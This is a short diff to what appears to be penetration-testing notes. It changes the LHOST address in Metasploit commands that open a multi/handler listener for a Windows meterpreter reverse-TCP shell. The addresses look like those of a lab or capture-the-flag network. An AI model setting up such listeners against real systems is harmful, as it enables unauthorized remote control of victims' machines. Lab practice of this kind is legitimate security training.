@@ -3,7 +3,7 @@ Open handler:
 msfconsole
 use exploit/multi/handler
 set payload windows/meterpreter/reverse_tcp
-set LHOST 10.10.14.16
+set LHOST 10.10.14.13
 
 
 
